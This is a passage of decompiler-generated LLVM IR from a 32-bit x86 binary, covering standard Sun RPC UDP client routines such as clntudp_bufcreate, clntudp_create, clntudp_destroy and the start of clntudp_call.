  %v0_8062f7c = load i32, i32* %eax.global-to-local, align 4
  %v1_8062f7c = load i32, i32* %ecx.global-to-local, align 4
  %v2_8062f7c = add i32 %v1_8062f7c, 32
  %v3_8062f7c = inttoptr i32 %v2_8062f7c to i32*
  store i32 %v0_8062f7c, i32* %v3_8062f7c, align 4
  br label %dec_label_pc_8062fe8

dec_label_pc_8062f81:                             ; preds = %entry
  %v1_8062f81 = add i32 %v3_8062f2c, 28
  %v2_8062f81 = inttoptr i32 %v1_8062f81 to i32*
  %v3_8062f81 = load i32, i32* %v2_8062f81, align 4
  store i32 %v3_8062f81, i32* %edx.global-to-local, align 4
  %v1_8062f84 = add i32 %v3_8062f2c, 32
  br label %dec_label_pc_8062f87

dec_label_pc_8062f87:                             ; preds = %dec_label_pc_8062f6c, %dec_label_pc_8062f81
  %storemerge.in.in = phi i32 [ %v1_8062f84, %dec_label_pc_8062f81 ], [ %v1_8062f6f, %dec_label_pc_8062f6c ]
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_8062f87 = add i32 %tmp7, 4
  %v3_8062f87 = inttoptr i32 %v2_8062f87 to i32*
  store i32 %storemerge, i32* %v3_8062f87, align 4
  %v0_8062f8a = load i32, i32* %edx.global-to-local, align 4
  %v1_8062f8a = load i32, i32* %ebx.global-to-local, align 4
  %v2_8062f8a = inttoptr i32 %v1_8062f8a to i32*
  store i32 %v0_8062f8a, i32* %v2_8062f8a, align 4
  br label %dec_label_pc_8062fe8

dec_label_pc_8062f8e:                             ; preds = %entry
  %v1_8062f91 = add i32 %v3_8062f2c, 8
  store i32 %v1_8062f91, i32* %eax.global-to-local, align 4
  %v3_8062f96 = bitcast i32* %arg3 to i16*
  %v4_8062f96 = call i32 @memcpy(i16* %v3_8062f96, i32 %v1_8062f91, i32 16)
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062fed

dec_label_pc_8062fa5:                             ; preds = %entry
  %v1_8062fa5 = inttoptr i32 %v3_8062f2c to i32*
  %v2_8062fa5 = load i32, i32* %v1_8062fa5, align 4
  store i32 %v2_8062fa5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062fda

dec_label_pc_8062fa9:                             ; preds = %entry
  %v1_8062fa9 = add i32 %v3_8062f2c, 88
  %v2_8062fa9 = inttoptr i32 %v1_8062fa9 to i32*
  %v3_8062fa9 = load i32, i32* %v2_8062fa9, align 4
  store i32 %v3_8062fa9, i32* %eax.global-to-local, align 4
  %v1_8062fac = inttoptr i32 %v3_8062fa9 to i32*
  %v2_8062fac = load i32, i32* %v1_8062fac, align 4
  %v1_8062fae = call i32 @llvm.bswap.i32(i32 %v2_8062fac)
  store i32 %v1_8062fae, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062fda

dec_label_pc_8062fb2:                             ; preds = %entry
  %v2_8062fb2 = load i32, i32* %arg3, align 4
  store i32 %v2_8062fb2, i32* %eax.global-to-local, align 4
  %v1_8062fb4 = add i32 %v3_8062f2c, 88
  %v2_8062fb4 = inttoptr i32 %v1_8062fb4 to i32*
  %v3_8062fb4 = load i32, i32* %v2_8062fb4, align 4
  store i32 %v3_8062fb4, i32* %edx.global-to-local, align 4
  %v1_8062fb7 = add i32 %v2_8062fb2, -1
  %v1_8062fb8 = call i32 @llvm.bswap.i32(i32 %v1_8062fb7)
  store i32 %v1_8062fb8, i32* %eax.global-to-local, align 4
  %v2_8062fba = inttoptr i32 %v3_8062fb4 to i32*
  store i32 %v1_8062fb8, i32* %v2_8062fba, align 4
  %v0_8062fbc.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_8062fda.pre.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8062fbc

dec_label_pc_8062fbc:                             ; preds = %entry, %dec_label_pc_8062fb2
  %v1_8062fda.pre = phi i32 [ %tmp7, %entry ], [ %v1_8062fda.pre.pre, %dec_label_pc_8062fb2 ]
  %v0_8062fbc = phi i32 [ %v3_8062f2c, %entry ], [ %v0_8062fbc.pre, %dec_label_pc_8062fb2 ]
  %v1_8062fbc = add i32 %v0_8062fbc, 88
  %v2_8062fbc = inttoptr i32 %v1_8062fbc to i32*
  %v3_8062fbc = load i32, i32* %v2_8062fbc, align 4
  store i32 %v3_8062fbc, i32* %eax.global-to-local, align 4
  %v1_8062fbf = add i32 %v3_8062fbc, 16
  %v2_8062fbf = inttoptr i32 %v1_8062fbf to i32*
  %v3_8062fbf = load i32, i32* %v2_8062fbf, align 4
  %v1_8062fc2 = call i32 @llvm.bswap.i32(i32 %v3_8062fbf)
  store i32 %v1_8062fc2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062fda

dec_label_pc_8062fc6:                             ; preds = %entry
  %v1_8062fc6 = add i32 %v3_8062f2c, 88
  %v2_8062fc6 = inttoptr i32 %v1_8062fc6 to i32*
  %v3_8062fc6 = load i32, i32* %v2_8062fc6, align 4
  store i32 %v3_8062fc6, i32* %edx.global-to-local, align 4
  %v2_8062fc9 = load i32, i32* %arg3, align 4
  %v1_8062fcb = call i32 @llvm.bswap.i32(i32 %v2_8062fc9)
  store i32 %v1_8062fcb, i32* %eax.global-to-local, align 4
  %v2_8062fcd = add i32 %v3_8062fc6, 16
  %v3_8062fcd = inttoptr i32 %v2_8062fcd to i32*
  store i32 %v1_8062fcb, i32* %v3_8062fcd, align 4
  br label %dec_label_pc_8062fe8

dec_label_pc_8062fd2:                             ; preds = %entry
  %v1_8062fd2 = add i32 %v3_8062f2c, 88
  %v2_8062fd2 = inttoptr i32 %v1_8062fd2 to i32*
  %v3_8062fd2 = load i32, i32* %v2_8062fd2, align 4
  store i32 %v3_8062fd2, i32* %eax.global-to-local, align 4
  %v1_8062fd5 = add i32 %v3_8062fd2, 12
  %v2_8062fd5 = inttoptr i32 %v1_8062fd5 to i32*
  %v3_8062fd5 = load i32, i32* %v2_8062fd5, align 4
  %v1_8062fd8 = call i32 @llvm.bswap.i32(i32 %v3_8062fd5)
  store i32 %v1_8062fd8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062fda

dec_label_pc_8062fda:                             ; preds = %dec_label_pc_8062fbc, %dec_label_pc_8062fa9, %dec_label_pc_8062fa5, %dec_label_pc_8062fd2
  %v1_8062fda = phi i32 [ %v1_8062fda.pre, %dec_label_pc_8062fbc ], [ %tmp7, %dec_label_pc_8062fa9 ], [ %tmp7, %dec_label_pc_8062fa5 ], [ %tmp7, %dec_label_pc_8062fd2 ]
  %v0_8062fda = phi i32 [ %v1_8062fc2, %dec_label_pc_8062fbc ], [ %v1_8062fae, %dec_label_pc_8062fa9 ], [ %v2_8062fa5, %dec_label_pc_8062fa5 ], [ %v1_8062fd8, %dec_label_pc_8062fd2 ]
  %v2_8062fda = inttoptr i32 %v1_8062fda to i32*
  store i32 %v0_8062fda, i32* %v2_8062fda, align 4
  br label %dec_label_pc_8062fe8

dec_label_pc_8062fde:                             ; preds = %entry
  %v1_8062fde = add i32 %v3_8062f2c, 88
  %v2_8062fde = inttoptr i32 %v1_8062fde to i32*
  %v3_8062fde = load i32, i32* %v2_8062fde, align 4
  store i32 %v3_8062fde, i32* %edx.global-to-local, align 4
  %v2_8062fe1 = load i32, i32* %arg3, align 4
  %v1_8062fe3 = call i32 @llvm.bswap.i32(i32 %v2_8062fe1)
  store i32 %v1_8062fe3, i32* %eax.global-to-local, align 4
  %v2_8062fe5 = add i32 %v3_8062fde, 12
  %v3_8062fe5 = inttoptr i32 %v2_8062fe5 to i32*
  store i32 %v1_8062fe3, i32* %v3_8062fe5, align 4
  br label %dec_label_pc_8062fe8

dec_label_pc_8062fe8:                             ; preds = %dec_label_pc_8062fc6, %dec_label_pc_8062fda, %dec_label_pc_8062f74, %dec_label_pc_8062f87, %dec_label_pc_8062f5f, %dec_label_pc_8062f53, %dec_label_pc_8062f47, %dec_label_pc_8062fde
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062fed

dec_label_pc_8062fed:                             ; preds = %dec_label_pc_8062f8e, %dec_label_pc_8062f40, %dec_label_pc_8062fe8
  %v0_8062ff0 = phi i32 [ 1, %dec_label_pc_8062f8e ], [ 0, %dec_label_pc_8062f40 ], [ 1, %dec_label_pc_8062fe8 ]
  %v2_8062fed = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8062fed, i32* %edx.global-to-local, align 4
  ret i32 %v0_8062ff0

; uselistorder directives
  uselistorder i32 %v3_8062f2c, { 15, 14, 13, 11, 12, 10, 7, 3, 6, 5, 4, 2, 1, 0, 9, 8, 16 }
  uselistorder i32 %tmp7, { 4, 5, 6, 0, 2, 3, 1, 7 }
  uselistorder i32* %edx.global-to-local, { 8, 0, 1, 2, 5, 3, 4, 6, 7 }
  uselistorder i32* %ecx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 18, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11, 13, 12, 9, 14, 15, 16, 17, 19, 20, 21 }
  uselistorder i32* %arg3, { 5, 4, 3, 1, 2, 0, 6 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8062fed, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8062fe8, { 7, 1, 0, 3, 2, 4, 5, 6 }
  uselistorder label %dec_label_pc_8062fda, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8062fbc, { 1, 0 }
  uselistorder label %dec_label_pc_8062f87, { 1, 0 }
}

define i32 @__GI_clntudp_bufcreate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg5 to i32
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8062ff2 = load i32, i32* @edi, align 4
  %v0_8062ff3 = load i32, i32* @esi, align 4
  %v0_8062ff4 = load i32, i32* @ebx, align 4
  store i32 %v0_8062ff4, i32* %stack_var_-16, align 4
  %v2_8062ffa = call i32 @malloc(i32 12)
  %v1_806300d = add i32 %arg6, 3
  %v1_8063010 = add i32 %arg7, 3
  %v1_8063013 = and i32 %v1_806300d, -4
  store i32 %v1_8063013, i32* @edi, align 4
  %v1_8063016 = and i32 %v1_8063010, -4
  store i32 %v1_8063016, i32* @ebx, align 4
  store i32 %v2_8062ffa, i32* @ebp, align 4
  %v2_806301b = add i32 %v1_8063013, 100
  %v3_806301b = add i32 %v2_806301b, %v1_8063016
  store i32 %v3_806301b, i32* %eax.global-to-local, align 4
  %v2_8063022 = call i32 @malloc(i32 %v3_806301b)
  store i32 %v2_8063022, i32* %eax.global-to-local, align 4
  %v0_806302a = load i32, i32* @ebp, align 4
  %v1_806302a = icmp eq i32 %v0_806302a, 0
  store i32 %v2_8063022, i32* @esi, align 4
  br i1 %v1_806302a, label %dec_label_pc_8063034, label %dec_label_pc_8063030

dec_label_pc_8063030:                             ; preds = %entry
  %v1_8063030 = icmp eq i32 %v2_8063022, 0
  %v1_8063032 = icmp eq i1 %v1_8063030, false
  br i1 %v1_8063032, label %dec_label_pc_8063062, label %dec_label_pc_8063034

dec_label_pc_8063034:                             ; preds = %entry, %dec_label_pc_8063030
  %v0_8063034 = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_8063034, i32* %eax.global-to-local, align 4
  store i32 %v0_8063034, i32* @ebx, align 4
  %v0_806303d = load i32, i32* @global_var_80753f0, align 16
  %v3_8063048 = call i32 @__GI_fputs(i32 ptrtoint ([31 x i8]* @global_var_806ef78.742 to i32), i32 %v0_806303d)
  store i32 %v3_8063048, i32* %eax.global-to-local, align 4
  %v0_8063050 = load i32, i32* @ebx, align 4
  %v1_8063050 = inttoptr i32 %v0_8063050 to i32*
  store i32 12, i32* %v1_8063050, align 4
  %v0_8063056 = load i32, i32* @ebx, align 4
  %v1_8063056 = add i32 %v0_8063056, 8
  %v2_8063056 = inttoptr i32 %v1_8063056 to i32*
  store i32 12, i32* %v2_8063056, align 4
  br label %dec_label_pc_80631ff

dec_label_pc_8063062:                             ; preds = %dec_label_pc_8063030
  %v1_8063062 = load i32, i32* @ebx, align 4
  %v2_8063062 = add i32 %v2_8063022, 96
  %v3_8063062 = add i32 %v2_8063062, %v1_8063062
  %v2_8063066 = add i32 %v2_8063022, 88
  %v3_8063066 = inttoptr i32 %v2_8063066 to i32*
  store i32 %v3_8063062, i32* %v3_8063066, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_806306d = add i32 %arg1, 2
  %v2_806306d = inttoptr i32 %v1_806306d to i16*
  %v3_806306d = load i16, i16* %v2_806306d, align 2
  %v4_806306d = icmp eq i16 %v3_806306d, 0
  %v1_8063072 = icmp eq i1 %v4_806306d, false
  br i1 %v1_8063072, label %dec_label_pc_806309e, label %dec_label_pc_8063074

dec_label_pc_8063074:                             ; preds = %dec_label_pc_8063062
  %v5_806307f = call i32 @pmap_getport(i32 %arg1, i32 %arg2, i32 %arg3, i32 17)
  %v1_8063087 = urem i32 %v5_806307f, 65536
  store i32 %v1_8063087, i32* %eax.global-to-local, align 4
  %v1_806308a = icmp eq i32 %v1_8063087, 0
  br i1 %v1_806308a, label %dec_label_pc_80631ff, label %dec_label_pc_8063092

dec_label_pc_8063092:                             ; preds = %dec_label_pc_8063074
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_8063096 = trunc i32 %v5_806307f to i16
  %v2_8063096 = call i16 @llvm.bswap.i16(i16 %v1_8063096)
  %v3_8063096 = zext i16 %v2_8063096 to i32
  store i32 %v3_8063096, i32* %eax.global-to-local, align 4
  store i16 %v2_8063096, i16* %v2_806306d, align 2
  br label %dec_label_pc_806309e

dec_label_pc_806309e:                             ; preds = %dec_label_pc_8063062, %dec_label_pc_8063092
  %v0_806309e = load i32, i32* @ebp, align 4
  %v1_806309e = add i32 %v0_806309e, 4
  %v2_806309e = inttoptr i32 %v1_806309e to i32*
  store i32 ptrtoint (i32* @global_var_807564c.743 to i32), i32* %v2_806309e, align 4
  %v1_80630a5 = add i32 %v2_8063022, 8
  store i32 %v1_80630a5, i32* %eax.global-to-local, align 4
  %v1_80630a8 = load i32, i32* @ebp, align 4
  %v2_80630a8 = add i32 %v1_80630a8, 8
  %v3_80630a8 = inttoptr i32 %v2_80630a8 to i32*
  store i32 %v2_8063022, i32* %v3_80630a8, align 4
  %v0_80630b2 = load i32, i32* %eax.global-to-local, align 4
  %tmp36 = inttoptr i32 %v0_80630b2 to i16*
  %v5_80630b3 = call i32 @memcpy(i16* %tmp36, i32 %arg1, i32 16)
  store i32 %arg4, i32* %edx.global-to-local, align 4
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v0_80630c3 = load i32, i32* @ebx, align 4
  %v2_80630c3 = add i32 %v2_8063022, 92
  %v3_80630c3 = inttoptr i32 %v2_80630c3 to i32*
  store i32 %v0_80630c3, i32* %v3_80630c3, align 4
  %v1_80630c6 = add i32 %v2_8063022, 56
  store i32 %v1_80630c6, i32* @ebx, align 4
  %v1_80630c9 = add i32 %v2_8063022, 24
  %v2_80630c9 = inttoptr i32 %v1_80630c9 to i32*
  store i32 16, i32* %v2_80630c9, align 4
  %v0_80630d0 = load i32, i32* %edx.global-to-local, align 4
  %v2_80630d0 = add i32 %v2_8063022, 28
  %v3_80630d0 = inttoptr i32 %v2_80630d0 to i32*
  store i32 %v0_80630d0, i32* %v3_80630d0, align 4
  %v0_80630d3 = load i32, i32* %eax.global-to-local, align 4
  %v2_80630d3 = add i32 %v2_8063022, 32
  %v3_80630d3 = inttoptr i32 %v2_80630d3 to i32*
  store i32 %v0_80630d3, i32* %v3_80630d3, align 4
  %v1_80630d6 = add i32 %v2_8063022, 36
  %v2_80630d6 = inttoptr i32 %v1_80630d6 to i32*
  store i32 -1, i32* %v2_80630d6, align 4
  %v1_80630dd = add i32 %v2_8063022, 40
  %v2_80630dd = inttoptr i32 %v1_80630dd to i32*
  store i32 -1, i32* %v2_80630dd, align 4
  %v0_80630e4 = load i32, i32* @edi, align 4
  %v2_80630e4 = add i32 %v2_8063022, 84
  %v3_80630e4 = inttoptr i32 %v2_80630e4 to i32*
  store i32 %v0_80630e4, i32* %v3_80630e4, align 4
  %v0_80630e7 = call i32 @_create_xid()
  store i32 %arg3, i32* %edx.global-to-local, align 4
  store i32 %v0_80630e7, i32* %stack_var_-72, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-112, align 4
  %v0_8063112 = load i32, i32* @edi, align 4
  %v3_8063113 = load i32, i32* %v3_8063066, align 4
  %v0_8063116 = load i32, i32* @ebx, align 4
  %v4_8063117 = inttoptr i32 %v0_8063116 to i32*
  %v5_8063117 = call i32 @__GI_xdrmem_create(i32* %v4_8063117, i32 %v3_8063113, i32 %v0_8063112, i32 0)
  %v2_806311f = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_806311f, i32* @eax, align 4
  %v0_8063124 = load i32, i32* @ebx, align 4
  %tmp37 = inttoptr i32 %v0_8063124 to i32*
  %v4_8063125 = call i32 @__GI_xdr_callhdr(i32* %tmp37, i32 %v2_806311f)
  store i32 %v4_8063125, i32* %eax.global-to-local, align 4
  %v1_806312d = icmp eq i32 %v4_8063125, 0
  br i1 %v1_806312d, label %dec_label_pc_80631ff, label %dec_label_pc_8063135

dec_label_pc_8063135:                             ; preds = %dec_label_pc_806309e
  %v1_8063135 = add i32 %v2_8063022, 60
  %v2_8063135 = inttoptr i32 %v1_8063135 to i32*
  %v3_8063135 = load i32, i32* %v2_8063135, align 4
  store i32 %v3_8063135, i32* %eax.global-to-local, align 4
  store i32 134623551, i32* %stack_var_-112, align 4
  %v5_806313c = add i32 %v3_8063135, 16
  %v6_806313c = inttoptr i32 %v5_806313c to i32*
  %v7_806313c = load i32, i32* %v6_806313c, align 4
  call void @__pseudo_call(i32 %v7_806313c)
  %v0_8063142 = load i32, i32* %eax.global-to-local, align 4
  %v2_8063142 = add i32 %v2_8063022, 80
  %v3_8063142 = inttoptr i32 %v2_8063142 to i32*
  store i32 %v0_8063142, i32* %v3_8063142, align 4
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v2_8063149 = load i32, i32* %arg5, align 4
  %v4_8063149 = icmp slt i32 %v2_8063149, 0
  %v1_806314c = icmp eq i1 %v4_8063149, false
  br i1 %v1_806314c, label %dec_label_pc_80631e6, label %dec_label_pc_8063152

dec_label_pc_8063152:                             ; preds = %dec_label_pc_8063135
  store i32 1, i32* %stack_var_-24, align 4
  store i32 2, i32* %stack_var_-112, align 4
  %v4_8063161 = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v4_8063161, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_8063170 = icmp slt i32 %v4_8063161, 0
  store i32 %v4_8063161, i32* %arg5, align 4
  %v1_8063174 = icmp eq i1 %v2_8063170, false
  br i1 %v1_8063174, label %dec_label_pc_806318f, label %dec_label_pc_8063176

dec_label_pc_8063176:                             ; preds = %dec_label_pc_8063152
  %v0_8063176 = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_8063176, i32* %eax.global-to-local, align 4
  %v1_806317b = inttoptr i32 %v0_8063176 to i32*
  store i32 12, i32* %v1_806317b, align 4
  store i32 %v0_8063176, i32* @ebx, align 4
  %v0_8063183 = load i32, i32* %stack_var_-112, align 4
  %v1_8063183 = call i32 @__errno_location(i32 %v0_8063183)
  store i32 %v1_8063183, i32* %eax.global-to-local, align 4
  %v1_8063188 = inttoptr i32 %v1_8063183 to i32*
  %v2_8063188 = load i32, i32* %v1_8063188, align 4
  store i32 %v2_8063188, i32* %eax.global-to-local, align 4
  %v1_806318a = load i32, i32* @ebx, align 4
  %v2_806318a = add i32 %v1_806318a, 8
  %v3_806318a = inttoptr i32 %v2_806318a to i32*
  store i32 %v2_8063188, i32* %v3_806318a, align 4
  br label %dec_label_pc_80631ff

dec_label_pc_806318f:                             ; preds = %dec_label_pc_8063152
  %v0_806318f = load i32, i32* @ecx, align 4
  store i32 %v4_8063161, i32* %stack_var_-112, align 4
  %v6_8063194 = call i32 @__GI_bindresvport(i32 %v4_8063161, i16* null, i32 %v0_806318f, i32 %v0_806318f)
  %v2_8063199 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v2_80631ad = load i32, i32* %arg5, align 4
  store i32 %v2_80631ad, i32* %stack_var_-112, align 4
  %v4_80631af = call i32 @ioctl(i32 %v2_80631ad, i32 21537, i32 %v2_8063199)
  %v2_80631b4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_80631b4, i32* %eax.global-to-local, align 4
  store i32 1, i32* %stack_var_-28, align 4
  store i32 4, i32* %stack_var_-112, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_80631d3 = load i32, i32* %arg5, align 4
  %v5_80631d5 = call i32 @__GI_setsockopt(i32 %v2_80631d3, i32 0, i32 11, i32 %v2_80631b4, i32 4)
  store i32 %v5_80631d5, i32* %eax.global-to-local, align 4
  %v1_80631dd = add i32 %v2_8063022, 4
  %v2_80631dd = inttoptr i32 %v1_80631dd to i32*
  store i32 1, i32* %v2_80631dd, align 4
  br label %dec_label_pc_80631ed

dec_label_pc_80631e6:                             ; preds = %dec_label_pc_8063135
  %v1_80631e6 = add i32 %v2_8063022, 4
  %v2_80631e6 = inttoptr i32 %v1_80631e6 to i32*
  store i32 0, i32* %v2_80631e6, align 4
  br label %dec_label_pc_80631ed

dec_label_pc_80631ed:                             ; preds = %dec_label_pc_806318f, %dec_label_pc_80631e6
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_80631f1 = load i32, i32* %arg5, align 4
  store i32 %v2_80631f1, i32* %eax.global-to-local, align 4
  %v2_80631f3 = inttoptr i32 %v2_8063022 to i32*
  store i32 %v2_80631f1, i32* %v2_80631f3, align 4
  %v0_80631f5 = call i32 @authnone_create()
  store i32 %v0_80631f5, i32* %eax.global-to-local, align 4
  %v1_80631fa = load i32, i32* @ebp, align 4
  %v2_80631fa = inttoptr i32 %v1_80631fa to i32*
  store i32 %v0_80631f5, i32* %v2_80631fa, align 4
  br label %dec_label_pc_8063221

dec_label_pc_80631ff:                             ; preds = %dec_label_pc_806309e, %dec_label_pc_8063074, %dec_label_pc_8063176, %dec_label_pc_8063034
  %v1_80631ff = icmp eq i32 %v2_8063022, 0
  br i1 %v1_80631ff, label %dec_label_pc_806320f, label %dec_label_pc_8063203

dec_label_pc_8063203:                             ; preds = %dec_label_pc_80631ff
  store i32 %v2_8063022, i32* %stack_var_-112, align 4
  %v1_8063207 = call i32 @free(i32 %v2_8063022)
  store i32 %v1_8063207, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806320f

dec_label_pc_806320f:                             ; preds = %dec_label_pc_80631ff, %dec_label_pc_8063203
  %v0_806320f = load i32, i32* @ebp, align 4
  %v1_806320f = icmp eq i32 %v0_806320f, 0
  br i1 %v1_806320f, label %dec_label_pc_8063221, label %dec_label_pc_8063213

dec_label_pc_8063213:                             ; preds = %dec_label_pc_806320f
  store i32 %v0_806320f, i32* %stack_var_-112, align 4
  store i32 0, i32* @ebp, align 4
  %v1_8063219 = call i32 @free(i32 %v0_806320f)
  store i32 %v1_8063219, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8063221

dec_label_pc_8063221:                             ; preds = %dec_label_pc_806320f, %dec_label_pc_80631ed, %dec_label_pc_8063213
  %v0_8063224 = load i32, i32* @ebp, align 4
  store i32 %v0_8063224, i32* %eax.global-to-local, align 4
  %v2_8063227 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8063227, i32* @esi, align 4
  store i32 %v0_8062ff3, i32* @edi, align 4
  store i32 %v0_8062ff2, i32* @ebp, align 4
  ret i32 %v0_8063224

; uselistorder directives
  uselistorder i32 %v4_8063161, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_8063087, { 1, 0 }
  uselistorder i32 %v5_806307f, { 1, 0 }
  uselistorder i32 %v2_8063022, { 1, 0, 4, 15, 5, 8, 14, 10, 9, 3, 18, 2, 17, 7, 6, 16, 13, 12, 11, 21, 20, 19, 22 }
  uselistorder i32* %stack_var_-112, { 1, 2, 3, 4, 5, 0, 6, 7, 8 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 %tmp11, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 0, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32* %arg5, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 4, 0, 3, 2 }
  uselistorder label %dec_label_pc_8063221, { 2, 0, 1 }
  uselistorder label %dec_label_pc_806320f, { 1, 0 }
  uselistorder label %dec_label_pc_80631ff, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_80631ed, { 1, 0 }
  uselistorder label %dec_label_pc_806309e, { 1, 0 }
  uselistorder label %dec_label_pc_8063034, { 1, 0 }
}

define i32 @__GI_clntudp_create(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %v8_8063250 = inttoptr i32 %arg5 to i32*
  %v9_8063250 = call i32 @__GI_clntudp_bufcreate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %v8_8063250, i32 %arg6, i32 8800, i32 8800)
  ret i32 %v9_8063250
}

define i32 @clntudp_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8063259 = load i32, i32* @esi, align 4
  %v0_806325a = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_8063262 = add i32 %arg1, 8
  %v2_8063262 = inttoptr i32 %v1_8063262 to i32*
  %v3_8063262 = load i32, i32* %v2_8063262, align 4
  store i32 %v3_8063262, i32* @ebx, align 4
  %v1_8063265 = add i32 %v3_8063262, 4
  %v2_8063265 = inttoptr i32 %v1_8063265 to i32*
  %v3_8063265 = load i32, i32* %v2_8063265, align 4
  %v4_8063265 = icmp eq i32 %v3_8063265, 0
  br i1 %v4_8063265, label %dec_label_pc_8063278, label %dec_label_pc_806326b

dec_label_pc_806326b:                             ; preds = %entry
  %v1_806326e = inttoptr i32 %v3_8063262 to i32*
  %v2_806326e = load i32, i32* %v1_806326e, align 4
  %v1_8063270 = call i32 @__libc_close(i32 %v2_806326e)
  %v0_8063278.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8063278

dec_label_pc_8063278:                             ; preds = %entry, %dec_label_pc_806326b
  %v0_8063285 = phi i32 [ %v3_8063262, %entry ], [ %v0_8063278.pre, %dec_label_pc_806326b ]
  %v1_8063278 = add i32 %v0_8063285, 60
  %v2_8063278 = inttoptr i32 %v1_8063278 to i32*
  %v3_8063278 = load i32, i32* %v2_8063278, align 4
  %v1_806327b = add i32 %v3_8063278, 28
  %v2_806327b = inttoptr i32 %v1_806327b to i32*
  %v3_806327b = load i32, i32* %v2_806327b, align 4
  %v1_806327e = icmp eq i32 %v3_806327b, 0
  br i1 %v1_806327e, label %dec_label_pc_806328e, label %dec_label_pc_8063282

dec_label_pc_8063282:                             ; preds = %dec_label_pc_8063278
  call void @__pseudo_call(i32 %v3_806327b)
  %v0_8063291.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_806328e

dec_label_pc_806328e:                             ; preds = %dec_label_pc_8063278, %dec_label_pc_8063282
  %v0_8063291 = phi i32 [ %v0_8063291.pre, %dec_label_pc_8063282 ], [ %v0_8063285, %dec_label_pc_8063278 ]
  %v1_8063292 = call i32 @free(i32 %v0_8063291)
  %v0_8063297 = load i32, i32* @esi, align 4
  store i32 %v0_806325a, i32* @ebx, align 4
  store i32 %v0_8063259, i32* @esi, align 4
  %v1_80632a0 = call i32 @free(i32 %v0_8063297)
  ret i32 %v1_80632a0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_806328e, { 1, 0 }
  uselistorder label %dec_label_pc_8063278, { 1, 0 }
}

define i32 @clntudp_call(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp75 = call i16 @__decompiler_undefined_function_2()
  %tmp76 = call i8 @__decompiler_undefined_function_5()
  %tmp84 = call i8 @__decompiler_undefined_function_5()
  %tmp85 = call i8 @__decompiler_undefined_function_5()
  %tmp86 = call i32 @__decompiler_undefined_function_0()
  %tmp88 = call i32 @__decompiler_undefined_function_0()
  %tmp107 = ptrtoint i32* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
